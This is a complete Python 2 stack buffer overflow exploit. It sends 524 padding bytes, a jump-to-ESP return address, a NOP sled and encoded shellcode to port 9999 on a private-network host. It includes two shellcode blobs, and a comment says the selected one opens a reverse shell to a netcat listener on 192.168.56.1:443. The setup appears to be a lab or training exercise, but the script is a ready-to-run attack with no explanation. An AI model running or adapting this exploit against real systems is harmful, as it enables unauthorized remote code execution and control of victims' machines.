#!/usr/bin/python
import socket

ip = '192.168.56.12'

# badchar = \x00

# ESP = 311712F3

esp_addr = "\xf3\x12\x17\x31"

wshell_code = ("\xbd\xa8\xdf\xfa\xc2\xd9\xc3\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x83\xc0\x04\x31\x68\x0e\x03\xc0\xd1\x18\x37\xec\x06\x5e"
"\xb8\x0c\xd7\x3f\x30\xe9\xe6\x7f\x26\x7a\x58\xb0\x2c\x2e\x55"
"\x3b\x60\xda\xee\x49\xad\xed\x47\xe7\x8b\xc0\x58\x54\xef\x43"
"\xdb\xa7\x3c\xa3\xe2\x67\x31\xa2\x23\x95\xb8\xf6\xfc\xd1\x6f"
"\xe6\x89\xac\xb3\x8d\xc2\x21\xb4\x72\x92\x40\x95\x25\xa8\x1a"
"\x35\xc4\x7d\x17\x7c\xde\x62\x12\x36\x55\x50\xe8\xc9\xbf\xa8"
"\x11\x65\xfe\x04\xe0\x77\xc7\xa3\x1b\x02\x31\xd0\xa6\x15\x86"
"\xaa\x7c\x93\x1c\x0c\xf6\x03\xf8\xac\xdb\xd2\x8b\xa3\x90\x91"
"\xd3\xa7\x27\x75\x68\xd3\xac\x78\xbe\x55\xf6\x5e\x1a\x3d\xac"
"\xff\x3b\x9b\x03\xff\x5b\x44\xfb\xa5\x10\x69\xe8\xd7\x7b\xe6"
"\xdd\xd5\x83\xf6\x49\x6d\xf0\xc4\xd6\xc5\x9e\x64\x9e\xc3\x59"
"\x8a\xb5\xb4\xf5\x75\x36\xc5\xdc\xb1\x62\x95\x76\x13\x0b\x7e"
"\x86\x9c\xde\xd1\xd6\x32\xb1\x91\x86\xf2\x61\x7a\xcc\xfc\x5e"
"\x9a\xef\xd6\xf6\x31\x0a\xb1\x38\x6d\x2c\x40\xd1\x6c\x4c\x43"
"\x9a\xf8\xaa\x29\xcc\xac\x65\xc6\x75\xf5\xfd\x77\x79\x23\x78"
"\xb7\xf1\xc0\x7d\x76\xf2\xad\x6d\xef\xf2\xfb\xcf\xa6\x0d\xd6"
"\x67\x24\x9f\xbd\x77\x23\xbc\x69\x20\x64\x72\x60\xa4\x98\x2d"
"\xda\xda\x60\xab\x25\x5e\xbf\x08\xab\x5f\x32\x34\x8f\x4f\x8a"
"\xb5\x8b\x3b\x42\xe0\x45\x95\x24\x5a\x24\x4f\xff\x31\xee\x07"
"\x86\x79\x31\x51\x87\x57\xc7\xbd\x36\x0e\x9e\xc2\xf7\xc6\x16"
"\xbb\xe5\x76\xd8\x16\xae\x87\x93\x3a\x87\x0f\x7a\xaf\x95\x4d"
"\x7d\x1a\xd9\x6b\xfe\xae\xa2\x8f\x1e\xdb\xa7\xd4\x98\x30\xda"
"\x45\x4d\x36\x49\x65\x44")

lshell_code = ("\xd9\xc7\xd9\x74\x24\xf4\x5e\xba\x99\x7c\xaa\xf0\x31\xc9\xb1"
"\x12\x31\x56\x17\x03\x56\x17\x83\x77\x80\x48\x05\xb6\xa2\x7a"
"\x05\xeb\x17\xd6\xa0\x09\x11\x39\x84\x6b\xec\x3a\x76\x2a\x5e"
"\x05\xb4\x4c\xd7\x03\xbf\x24\x28\x5b\x07\xb5\xc0\x9e\x78\xb4"
"\xab\x16\x99\x06\xad\x78\x0b\x35\x81\x7a\x22\x58\x28\xfc\x66"
"\xf2\xdd\xd2\xf5\x6a\x4a\x02\xd5\x08\xe3\xd5\xca\x9e\xa0\x6c"
"\xed\xae\x4c\xa2\x6e")

# shell_code give revese shell on nc @192.168.56.1 443
shell_code = lshell_code

buffer = "A" * 524 + esp_addr + "\x90"*20 + shell_code

print "Fuzzing PASS with %s bytes" % len(buffer)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(30)
connect=s.connect((ip,9999))
s.recv(1024)
s.send(buffer + '\r\n')
s.close()
